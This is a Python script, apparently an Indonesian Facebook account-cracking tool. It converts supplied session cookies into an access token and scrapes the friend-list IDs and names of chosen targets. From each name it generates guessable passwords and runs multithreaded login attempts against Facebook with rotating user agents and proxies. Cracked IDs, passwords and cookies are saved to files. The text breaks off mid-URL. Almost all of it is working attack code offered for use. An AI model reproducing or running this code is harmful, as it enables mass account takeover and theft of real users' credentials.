 $$$$$$  |$$$$$  \  $$ |  $$ |$$ |      $$ |            $$$$$$$$ |$$$$$$$  |$$ $$ $$/$$ |   $$$$/    
/  \__$$ |$$ |$$  \ $$ \__$$ |$$ |_____ $$ |_____       $$ |  $$ |$$ |  $$ |$$ |$$$/ $$ |    $$ |    
$$    $$/ $$ | $$  |$$    $$/ $$       |$$       |      $$ |  $$ |$$ |  $$ |$$ | $/  $$ |    $$ |    
 $$$$$$/  $$/   $$/  $$$$$$/  $$$$$$$$/ $$$$$$$$/       $$/   $$/ $$/   $$/ $$/      $$/     $$/     

	''')
                  
def banlog():
	print('''\033[1;34m 
	                      ....                                                .:      
                                   ==.                                           ...:.    
               -:  ..:.      .     .-**:.                       :                =...-=   
              .*   ..-: .....  ...-= :*.....:..             .  ::...         ....:+:=-:-. 
              +=  ::--.       ..::%+.+*.  :=::...           . -=.:.::..   .-==-::+#-=*-=+ 
              #: .:--.     :=+*+*#%@++@+:.=+=-:.         -==-***+-:...:..**=-+=--##+#*-*:=
              %. -##**- .:=++---=-+#@*@%=:-=+#=...       +=-:**==-::=#+::*+-%@@@@@@@@@@@-=
          =.  #- -##*+*=.-=+-:-*#*##@@%%%%+:*@%-:.---:   =-:*-:-.:++*@#*%@@@@@@@@@@@@@@@++
         =%.  -+=:++=-++.:---%@@@@%%#****+++*#%@@%*==+==**+=:. ==.=@@@@@@@@@@@@@@@@@@@@%-=
         #%:   =+:==--=*:=%:+@@%%##**+=*#####*+*#%@@%@%*-==+:. .*+-+%@@@@@@@@@@@@@@@@@@*+*
*  +    .%%=.  .---=--=*:*@=%@%%#***###+@%#*=++=+*#%@@++::.-+--*@@@@+@@@@@@@@@@@@@@@@@@%#+
% -*-   .#*---. -..---+---%%@@@%%%%#+#+**++. ..:-*+%@%==.+=:*+%@@%@@@%@@@@@@@@@@@@@@@@%++.
%.:-=.   =*:::::. .-==-:-==@@@%%#+++++====::.:-+##%@%+=..-..:%@@%*@@@+@@@@@@@@@@@@@@@@%+= 
@=:::-:.  +-...   -++-- :**#@%*==++==---===+*#%%*+@%+-::::::+@@%=*@@%+%@%@@@@@@@@@@%%@*== 
%%:=---=-. :..  .-+*: .   :+#@@@#*+=--++*#++#%#==**:  ..:::%@@#*-*%#*=++*+#%####+###*=----
*@+-++***+=--:::+. .+#@*  :. .:=+*%%##*:-#%#+=-=.:    ....-@@@*=:++++-=::..::-=:=-=-:::=.=
:@%=::::::.. .  =#+:%%#+-%%= ...:=*##%%*-:=*+=-..    ..:=#@@@@#+-++=++-::...::-+==--:--.-#
 #*-===.     .  ...**-+-**-::%+ .::--=-=++-::-=:.   ..:--%@@@@#=:=*++*=-=..-----=::--=:-==
 :#-==+#=         .#=.:=:-:.-+- +- .:::::-==+=--:....:++:=%@@%=-=-*#%#-==--:..=*--+*=-##+.
  :-.=###.         --::--::...  :.-+.  .::...:-====--::.=---+++-:*===:+*=+.-+#%==###@@@%: 
   :- .:.   :+#%%#-  -+=:::**+=-.        :-.   ..:::-++=.....::-=+=+-:..-*=@@@%+%@@@@@%:  
    :*+++=:+**+**#%=  :---:-::..-==++++==::-:.    =+--+++.    ..==-.....:##@%*#@@#:..:.   
     .-::+@@%%#*++##.+#-:.....:+*+=----=+*+.::.   .=-:::-- ..:: .-.  .:..=@%=-%@@=        
  .      :=##%%%%###*%@%=....==--=**#######+....    . :..::  ..:. :  .:. .**=-##*+.       
    ..   ..:-**#--%@%%#%%: .-=*%@@%*++*=:-**:.    :.  .   :    ... .   . .-=:-*=*#=       
            ::*+--+*%@@@%*.+%@@@@@@*:::=:::=*=-:. .:. .. ....  .-. .:.   -+=-***+=*.      
            ..=+: -*-%*-#@%@@@%@@@@@=..:....-:..-..#+-::.::::..=*-..-+-:.+*+%+:--.-       
             .:+- .=:++=.*@@@%%#%%@@-=-. .-.   .=-:*-:==-==-=:-+%#=.++*##*=:*- .-.-       
              :=*:.-:==..#@@%%%#%%@@++.=++--:.-==+*=:  =*-..-#**-=*#=..=#+..=: :=-:       
               :*=..=-- :%@@@%%%###%%#: :=:. -#=:.=-.  =#:  :#=:..:**. .+#:.+-.==-        
                :*:.:-= :%@*########%%= .#*:.-*+:. :-..+@*. -##-  .+#- .*%*=-.=:          
              .. :+..--. #%===+*#*##%##=*%%#=++*=.  :*-+%%=:#++*+.:***:-#*#*:=-           
                :.-+..-- -%--=+-#*%##*+#%%#***+++*=::#%%@%##*=+++***++##*++#*+--.         
               .-%#+=:.-:.*+--=:+++#%%###*#**+=+**+**#%#%%#*==**+++*#*******=+. -         
                .-++=::.-::#=-=---:=+#*+#=.-++=+-:++=*###@%%+=::++*=:*#*-:*-.+:.:-        
                 ..-+-::::::+-==----=%= :+  .+*-  +-..#=:+%%%:  -*=. :*:  =..=*=+*-       
                  . :=-::::-::-=++-:+@#..--..=-:  =. .-. .+*#:  .*:  .+. .***+=--**.      
                    . ==..:::=-.:-+++*#+=::.::-=:-=-.=:.  --==:..=+. :+*==-#**==-:+:      
            .     ..   +-...::+*=::--:--++-.:-::=::-=--::.::--=+=::==+=+=:-***+::-:+.     
                       .=... :-=#=:+-+*=+**+===----....:=-.:=::::::-=+=--:::+%#+=-+%:     
                        :..=..-:=-.=+--+***#++**===::.      :::......:::-::.:=++=:=*:     
                       .:.: :--::-.:***=+*#*:*--::++-:........::------::::----===-:+.     
                       :::    :=..::.=+++=::=+. -=:*===--:::::..:-::---:::-----:-::+-     
                                :::--=---=+=-..-===#=:.. .:........----=+**==:.:::-:      
                                       ....+=-=+=-##**+++++=-::::::.:-=--===-::::+=       
                                            .::..-=====-==--==-::::--=+-::::::::**-       
                                                   :----=====---:.  ..-.  .:..-#*:        
                                                           ..-==--=--:-:..:*=++:          

 /$$$$$$$  /$$        /$$$$$$   /$$$$$$  /$$   /$$        /$$$$$$  /$$   /$$ /$$   /$$ /$$       /$$      
| $$__  $$| $$       /$$__  $$ /$$__  $$| $$  /$$/       /$$__  $$| $$  /$$/| $$  | $$| $$      | $$      
| $$  \ $$| $$      | $$  \ $$| $$  \__/| $$ /$$/       | $$  \__/| $$ /$$/ | $$  | $$| $$      | $$      
| $$$$$$$ | $$      | $$$$$$$$| $$      | $$$$$/        |  $$$$$$ | $$$$$/  | $$  | $$| $$      | $$      
| $$__  $$| $$      | $$__  $$| $$      | $$  $$         \____  $$| $$  $$  | $$  | $$| $$      | $$      
| $$  \ $$| $$      | $$  | $$| $$    $$| $$\  $$        /$$  \ $$| $$\  $$ | $$  | $$| $$      | $$      
| $$$$$$$/| $$$$$$$$| $$  | $$|  $$$$$$/| $$ \  $$      |  $$$$$$/| $$ \  $$|  $$$$$$/| $$$$$$$$| $$$$$$$$
|_______/ |________/|__/  |__/ \______/ |__/  \__/       \______/ |__/  \__/ \______/ |________/|________/
                                                                                                          
  /$$$$$$  /$$$$$$$  /$$      /$$ /$$     /$$                                                             
 /$$__  $$| $$__  $$| $$$    /$$$|  $$   /$$/                                                             
| $$  \ $$| $$  \ $$| $$$$  /$$$$ \  $$ /$$/                                                              
| $$$$$$$$| $$$$$$$/| $$ $$/$$ $$  \  $$$$/                                                               
| $$__  $$| $$__  $$| $$  $$$| $$   \  $$/                                                                
| $$  | $$| $$  \ $$| $$\  $ | $$    | $$                                                                 
| $$  | $$| $$  | $$| $$ \/  | $$    | $$                                                                 
|__/  |__/|__/  |__/|__/     |__/    |__/                                                                 

	''')
###----------[ NGECEK COOKIES ]----------###
def brayenlogin():
	try:
		token = open('.tokenakun.txt','r').read()
		cok = open('.cookiesakun.txt','r').read()
		tokenefb.append(token)
		try:
			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
			nteng = json.loads(gerap.text)['id']
			menu(nteng)
		except KeyError:
			brayenmenu()
		except requests.exceptions.ConnectionError:
			bra_anim(f'{mer}koneksimu tidak ada tod :(')
			exit()
	except IOError:
		brayenmenu()
		
###----------[ LOGIN COOKIESNYA ]----------###
def brayenmenu():
    try:
        os.system('clear')
        banlog()
        ses = requests.Session()
        print('─────────────────────────────')
        your_cookies=input(f'cookies :{xxx}{hijo} ')
        with requests.Session() as r:
                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                })
                data = {
                    'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
                    'scope': ''
                }
                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
                code, user_code = response['code'], response['user_code']
                verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
                r.headers.pop(
                    'content-type'
                )
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                    'sec-fetch-site': 'cross-site',
                    'Host': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-dest': 'document',
                })
                response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r')
                else:
                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
                    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
                    data = {
                        'fb_dtsg': fb_dtsg,
                        'jazoest': jazoest,
                        'qr': 0,
                        'user_code': user_code,
                    }
                    r.headers.update({
                        'origin': 'https://m.facebook.com',
                        'referer': verification_url,
                        'content-type': 'application/x-www-form-urlencoded',
                        'sec-fetch-site': 'same-origin',
                    })
                    response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

                        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                        jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
                        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
                        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
                        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
                        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
                        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
                        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                        r.headers.update({
                            'origin': 'https://m.facebook.com',
                            'referer': response3.url,
                            'content-type': 'application/x-www-form-urlencoded',
                        })
                        data = {
                            'fb_dtsg': fb_dtsg,
                            'jazoest': jazoest,
                            'scope': scope,
                            'display': display,
                            'user_code': user_code,
                            'logger_id': logger_id,
                            'auth_type': auth_type,
                            'encrypted_post_body': encrypted_post_body,
                            'return_format[]': return_format,
                        }
                        response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
                        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        r.headers.update({
                            'referer': 'https://m.facebook.com/',
                        })
                        response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
                        if 'Sukses!' in str(response6):
                            r.headers.update({
                                'sec-fetch-mode': 'no-cors',
                                'referer': 'https://graph.facebook.com/',
                                'Host': 'graph.facebook.com',
                                'accept': '*/*',
                                'sec-fetch-dest': 'script',
                                'sec-fetch-site': 'cross-site',
                            })
                            response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                            ken = open(".tokenakun.txt", "w").write(access_token)
                            cok = open(".cookiesakun.txt", "w").write(your_cookies)
                            bra_anim(f'{puti}━─═ ◕➤{ung} login berhasil ster jalanin ulang scnya')
                            exit()
                        else:
                            print('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Gagal...')
    except Exception as e:
        os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
        bra_anim(f'{puti}━─═ ◕➤{hijo} login gagal ster coba ganti tumbal')
        exit()

###----------[ BAGIAN MENU ]----------###
def menu(id):
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		bra_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		brayenmenu()
	os.system('clear')
	banner()
	print(f'{ung}─────────────────────────────')
	print(f'{kun}━─═ ◕➤Ketik Y Untuk Memulai Crack Publick')
	print(f'{mer}━─═ ◕➤Ketik M Untuk Memulai Crack Massal')
	print(f'{biru}━─═ ◕➤Ketik K Untuk Cek Result Atau Cek Hasil')
	helpbas = input(f'{hijo}━─═ ◕➤ : ')
	if helpbas in ['y','Y']:
		nge_krek()
	if helpbas in ['M','m']:
		nge_crack()
	if helpbas in ['k','K']:
		result()
	else:
		bra_anim(f'{kun}━─═ ◕➤yang bener lah ster')

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		bra_anim(f'{mer}cookies telah kadaluarsa ster')
		exit()
	print(f'{ung}')
	idnyanih = input(f'━─═ ◕➤masukkan ID: ')
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		print(f' ━─═ ◕➤terkumpul : '+str(len(id)))
		atur_dulu()
	except requests.exceptions.ConnectionError:
		bra_anim(f'{ung}━─═ ◕➤koneksi terputus')
		exit()
	except (KeyError,IOError):
		bra_anim(f'{biru}━─═ ◕➤ teman tidak publik')
		exit()

def nge_crack():
	try:
		token = open('.tokenakun.txt','r').read()
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{biru}━─═ ◕➤ Mau Berapa Idz Target  : '))
	except ValueError:
		print('{biru}━─═ ◕➤ Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f'{h}{biru}━─═ ◕➤ Pertemanan Tidak Publik  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{biru}━─═ ◕➤ Masukan Idz Target Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenefb[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{biru}━─═ ◕➤ Unstable Signal ')
			exit()
	try:
		print(f'{biru}━─═ ◕➤ Total Idz Target Yang Terkumpul : '+str(len(id)))
		atur_dulu()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('{biru}━─═ ◕➤ Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f'{biru}━─═ ◕➤  Friendship Not Public ')
		time.sleep(3)
		back()

def result():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
	kz = input(f' {biru}━─═ ◕➤ Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('/sdcard/CP')
		except FileNotFoundError:
			print(' {biru}━─═ ◕➤ File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' {biru}━─═ ◕➤ Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} ━─═ ◕➤ {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ━─═ ◕➤ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ━─═ ◕➤ File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('/sdcard/OK')
		except FileNotFoundError:
			print(' ━─═ ◕➤ File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' ━─═ ◕➤ Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n {biru}━─═ ◕➤ Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ━─═ ◕➤ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' ━─═ ◕➤ File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' {biru}━─═ ◕➤ Pilih Yang Bener Kontol ')
		exit()
###----------[  ATUR DULU STER ]----------###
def atur_dulu():
	print(f'{ung}')
	print(f'━─═ ◕➤ [[{biru}CRACK DARI ID{biru}]]')
	print(f'━─═ ◕➤1. MAMAT [{kun}TUA{biru}]')
	print(f' ━─═ ◕➤2. JOE [{kun}MUDA{biru}]')
	print(f' ━─═ ◕➤3. NANI [{kun}ACAK{biru}]')
	aturid = input(f'{hijo}━─═ ◕➤: ')
	if aturid in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		bra_anim(f'{biru} ━─═ ◕➤yang bener lah ster')
		exit()
	print(f'{ung}')
	print('━─═ ◕➤ 1. MS')
	print(' ━─═ ◕➤2. REG (Dijamin Gacor)')
	print(' ━─═ ◕➤3. MET1 (Kopi Mix)')
	print(' ━─═ ◕➤4. MET2 (Kopi Susu)')
	print(' ━─═ ◕➤5. MET3 (Kopi Torabika)')
	metod = input(f'{biru}>> : ')
	if metod in ['1','01']:
		bra.append('free')
	elif metod in ['2','02']:
		bra.append('mobile')
	elif metod in ['3','03']:
		bra.append('metod1')
	elif metod in ['4','04']:
		bra.append('metod2')
	elif metod in ['5','05']:
		bra.append('metod3')
	else:
		bra.append('free')
	passwrd()
		
###----------[  BAGIAN WORDLIST ]----------###
def passwrd():
	global prog,des
	print(f'{biru}')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'05')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'free' in bra:
					gas_krek.submit(crackfree,idf,pwv)
				elif 'mobile' in bra:
					gas_krek.submit(crackmobile,idf,pwv)
				elif 'metod1' in bra:
					gas_krek.submit(metod1,idf,pwv)
				elif 'metod2' in bra:
					gas_krek.submit(metod2,idf,pwv)
				elif 'metod3' in bra:
					gas_krek.submit(metod3,idf,pwv)
				else:
					gas_krek.submit(crackfree,idf,pwv)
		print(f'{hijo}')
		print(f'{biru}+ {puti}akun ok : {biru}%s{kun} '%(ok))
		print(f'{ung}+ {mer}akun cp : {ung}%s{kun} '%(cp))
		print(f'{hijo}')
		
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
###----------[ REGULAR ]----------###
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{H}REGULAR {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(uaa)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ ASYNC ]----------###
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r🗿{B}ASYNC {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(uaa)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRi